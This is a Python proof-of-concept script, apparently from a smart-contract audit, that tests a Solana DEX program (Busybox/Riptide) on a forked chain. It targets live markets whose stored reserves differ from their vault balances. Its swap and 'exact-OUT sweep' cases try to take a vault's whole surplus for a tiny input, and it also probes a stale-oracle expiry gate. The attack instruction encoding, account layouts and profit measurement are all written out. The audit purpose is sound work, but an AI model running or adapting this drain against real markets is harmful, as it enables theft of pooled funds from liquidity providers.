"""Busybox/Riptide v2.1.1 swap-path profit test on live markets whose stored `reserves` diverge
from the market vault balances (recon/busybox_vault_divergence.json: 10 of 32 markets diverge,
22 match exactly - which also confirms the layout offsets).

Swap account list (from the v2.1.1 client + live deposit forms):
  [trader("authority") W/S, market W, mintA W, mintB W, traderA W, traderB W,
   marketVaultA W, marketVaultB W, tokenProgramA, tokenProgramB, memo, instructionsSysvar]
data: tag | amount u64 | amount_is_token_a u8 | SlippageTolerance (0 None / 1 MaxExecutionPrice u128
      / 2 OtherAmountThreshold u64) | allow_partial_fill u8

If the quote is computed from the *stored reserves* while the transfer settles from the *vault*,
a market whose vault holds more of token X than reserves[X] lets a swapper take X at a price the
vault does not support -> attacker-positive delta, permissionless.
"""
import sys, json, struct, base64
sys.path.insert(0, "/home/user/orca-audit/tools")
import forknet as F
from solders.instruction import Instruction
from solders.pubkey import Pubkey

BB = "riptK81hDxhe5pW5jSzSM9iRA8azgEgLJ4dXkPtBS7j"
actor = F.load_actor(); A = str(actor.pubkey())
MKTS = {m["address"]: m for m in json.load(open("/home/user/orca-audit/recon/busybox_markets_live.json"))["markets"]}
DIV = json.load(open("/home/user/orca-audit/recon/busybox_vault_divergence.json"))


def prog_of(mint):
    v = F.get_account(mint)
    return (v or {}).get("owner") or F.TOKEN


def ata_of(owner, mint, prog):
    return str(Pubkey.find_program_address([bytes(F.pk(owner)), bytes(F.pk(prog)), bytes(F.pk(mint))],
                                           F.pk(F.ATA))[0])


def snap(a):
    v = F.get_account(a)
    if not v:
        return None
    raw = base64.b64decode(v["data"][0])
    o = {"lamports": v["lamports"], "space": v["space"], "owner": v["owner"],
         "hash": F.hashlib.sha256(raw).hexdigest()}
    if v["space"] == 165 and len(raw) >= 72:
        o["tokenAmount"] = struct.unpack_from("<Q", raw, 64)[0]
    if v["space"] == 82 and len(raw) >= 44:
        o["supply"] = struct.unpack_from("<Q", raw, 36)[0]
        o["decimals"] = raw[44]
    if v["space"] == 1024 and len(raw) >= 752:
        o["market"] = {"authority": F.b58(raw[8:40]), "updater": F.b58(raw[40:72]),
                       "sequence": struct.unpack_from("<Q", raw, 136)[0],
                       "validUntil": struct.unpack_from("<Q", raw, 144)[0],
                       "reservesA": struct.unpack_from("<Q", raw, 736)[0],
                       "reservesB": struct.unpack_from("<Q", raw, 744)[0],
                       "minSpread": struct.unpack_from("<i", raw, 664)[0],
                       "arbPenalty": struct.unpack_from("<I", raw, 668)[0],
                       "cuPen": raw[2], "imbalanceGuard": raw[3],
                       "minOracle": int.from_bytes(raw[688:704], "little"),
                       "maxOracle": int.from_bytes(raw[704:720], "little"),
                       "skewMin": struct.unpack_from("<i", raw, 720)[0],
                       "skewMax": struct.unpack_from("<i", raw, 724)[0],
                       "maxA": struct.unpack_from("<I", raw, 728)[0],
                       "maxB": struct.unpack_from("<I", raw, 732)[0]}
    return o


def M(k, w=False, s=False):
    return F.AM(k, writable=w, signer=s)


RESULTS = []


def run(name, ixs, watch, note=""):
    before = {a: snap(a) for a in watch}
    sb = F.get_slot()
    r = F.send(ixs, actor)
    after = {a: snap(a) for a in watch}
    det = r.get("detail", {})
    logs = [l.strip() for l in det.get("logs", [])]
    d = {}
    for a in watch:
        b, af = before.get(a) or {}, after.get(a) or {}
        e = {}
        if (b.get("lamports") or 0) != (af.get("lamports") or 0):
            e["lamports"] = (af.get("lamports") or 0) - (b.get("lamports") or 0)
        if b.get("tokenAmount") is not None and b.get("tokenAmount") != af.get("tokenAmount"):
            e["tokenAmount"] = (af.get("tokenAmount") or 0) - (b["tokenAmount"] or 0)
        if b.get("market") and af.get("market"):
            ch = {k: [b["market"][k], af["market"][k]] for k in b["market"] if b["market"][k] != af["market"][k]}
            if ch:
                e["market"] = ch
        if e:
            d[a] = e
    rec = {"case": name, "note": note, "forkSlotBefore": sb, "forkSlotAfter": F.get_slot(),
           "sig": r.get("result"), "err": det.get("err") or r.get("error"), "logs": logs,
           "deltas": d, "before": before, "after": after}
    RESULTS.append(rec)
    print(f"\n### {name}  [{note}]")
    print("   slot", sb, "->", rec["forkSlotAfter"], "err:", json.dumps(rec["err"])[:170])
    print("   logs:", " | ".join(l.split("log:")[-1].strip() for l in logs if "log:" in l or "failed" in l)[:340])
    print("   deltas:", json.dumps(d)[:700])
    return rec


def swap_ix(mkt, trader_a, trader_b, mv_a, mv_b, amount, is_a, partial=0, sl=None, prog_a=None, prog_b=None):
    m = MKTS[mkt]
    mA, mB = m["mint_a"], m["mint_b"]
    data = bytes([2]) + struct.pack("<Q", amount) + bytes([1 if is_a else 0])
    data += bytes([0]) if sl is None else (bytes([1]) + struct.pack("<Q", *sl) if isinstance(sl, tuple)
                                          else bytes([2]) + struct.pack("<Q", sl))
    data += bytes([partial])
    return Instruction(F.pk(BB), data, [
        M(A, w=True, s=True), M(mkt, w=True), M(mA, w=True), M(mB, w=True),
        M(trader_a, w=True), M(trader_b, w=True), M(mv_a, w=True), M(mv_b, w=True),
        M(prog_a or prog_of(mA)), M(prog_b or prog_of(mB)), M(F.MEMO), M(F.IX_SYSVAR)])


def fund(owner_ata, amount, prog):
    v = F.get_account(owner_ata)
    if not v:
        return {"err": "ata absent"}
    raw = bytearray(base64.b64decode(v["data"][0]))
    struct.pack_into("<Q", raw, 64, amount)
    return F.rpc.rpc("surfnet_setAccount", [owner_ata, {"lamports": v["lamports"], "data": bytes(raw).hex(),
                                                        "owner": prog, "executable": False}], url=F.FORK)


def main():
    now = F.get_slot()
    cands = [r for r in DIV if r["fresh"] and r["balA"] is not None and r["balB"] is not None]
    print("fork slot:", now)
    for c in cands:
        a = c["addr"]
        ex_a = (c["balA"] or 0) - (c["resA"] or 0)
        ex_b = (c["balB"] or 0) - (c["resB"] or 0)
        print(f"\n=== market {a}\n    vaultA {c['balA']:,} reservesA {c['resA']:,} excessA {ex_a:+,}")
        print(f"    vaultB {c['balB']:,} reservesB {c['resB']:,} excessB {ex_b:+,}")
        m = MKTS[a]
        side = None
        if ex_b > 0:
            side, take_mint, take_ata, give_mint = "B", m["mint_b"], c["vb"], m["mint_a"]
        elif ex_a > 0:
            side, take_mint, take_ata, give_mint = "A", m["mint_a"], c["va"], m["mint_b"]
        else:
            print("    no vault>reserves side; skip the drain test (still probing the expiry guard)")
        pa, pb = prog_of(m["mint_a"]), prog_of(m["mint_b"])
        u_a, u_b = ata_of(A, m["mint_a"], pa), ata_of(A, m["mint_b"], pb)
        for mint, prog in ((m["mint_a"], pa), (m["mint_b"], pb)):
            _, x = F.create_ata(A, mint, prog, A)
            F.send([x], actor)
        watch = [A, a, c["va"], c["vb"], u_a, u_b]
        if side:
            # fund the trader's INPUT side so the swap reaches pricing (fork-only fixture funding)
            give_ata = u_a if side == "B" else u_b
            amt = min(10 ** 6, max(1, (c["resA"] if side == "B" else c["resB"]) // 1000))
            fr = F.get_account(give_ata)
            gm = F.get_account(m["mint_a"] if side == "B" else m["mint_b"])
            gdec = base64.b64decode(gm["data"][0])[44] if gm else 6
            amt = 10 ** gdec
            fund(give_ata, amt, F.get_account(give_ata)["owner"])
            print(f"    fixture-funded input {amt:,} units (decimals {gdec}) into {give_ata}")
            run(f"BB-P01 swapExactIn on {a[:10]} (take token {side}; vault>reserves by {max(ex_a,ex_b):,})",
                [swap_ix(a, u_a, u_b, c["va"], c["vb"], amt, side == "A")], watch,
                "reserves-priced swap against a vault that holds more")
            # and the mirrored direction, to see whether the state update keeps reserves==vault
            # DECISIVE: request the whole vault surplus in one exact-out swap
            want = (c["balB"] if side == "B" else c["balA"]) or 0
            run(f"BB-P01b exact-OUT sweep of the entire vault (asks {want:,}; reserves say {max(c['resB'],c['resA']):,})",
                [Instruction(F.pk(BB), bytes([3]) + struct.pack("<Q", want) + bytes([1 if side == "B" else 0])
                                      + bytes([0]) + bytes([1]),
                 [M(A, w=True, s=True), M(a, w=True), M(m["mint_a"], w=True), M(m["mint_b"], w=True),
                  M(u_a, w=True), M(u_b, w=True), M(c["va"], w=True), M(c["vb"], w=True),
                  M(pa), M(pb), M(F.MEMO), M(F.IX_SYSVAR)])],
                watch, "can a swapper take reserves+excess (the vault's whole balance) for a tiny input?")
            run(f"BB-P02 swapExactIn the other direction on {a[:10]}",
                [swap_ix(a, u_a, u_b, c["va"], c["vb"], 10 ** gdec, side != "A")], watch,
                "does the exchange move reserves toward the vault?")
        # expiry gate on a stale market (same shape, real vault accounts)
    stale = [r for r in DIV if not r["fresh"] and (r["resA"] + r["resB"]) > 10 ** 9]
    for c in stale[:3]:
        a = c["addr"]
        m = MKTS[a]
        pa, pb = prog_of(m["mint_a"]), prog_of(m["mint_b"])
        u_a, u_b = ata_of(A, m["mint_a"], pa), ata_of(A, m["mint_b"], pb)
        for mint, prog in ((m["mint_a"], pa), (m["mint_b"], pb)):
            _, x = F.create_ata(A, mint, prog, A)
            F.send([x], actor)
        gi = F.get_account(m["mint_b"])
        gd = base64.b64decode(gi["data"][0])[44] if gi else 6
        fund(u_b, 10 ** gd, F.get_account(u_b)["owner"] if F.get_account(u_b) else pb)
        print(f"\n=== STALE market {a} validUntil={c and MKTS[a]['valid_until']} now={F.get_slot()}")
        run(f"BB-P03 swapExactIn on STALE-oracle market {a[:10]}",
            [swap_ix(a, u_a, u_b, c["va"], c["vb"], 10 ** gd, False)],
            [A, a, c["va"], c["vb"], u_a, u_b], "oracle expiry gate with a fully valid account shape")
    json.dump({"forkSlot": now, "results": RESULTS,
               "note": "attacker input balances set by fork cheatcode (fixture funding); "
                       "no protocol-owned balance fabricated"},
              open("/home/user/orca-audit/evidence/BBP_swap_profit.json", "w"), indent=1)
    print("\nsaved evidence/BBP_swap_profit.json")


if __name__ == "__main__":
    main()
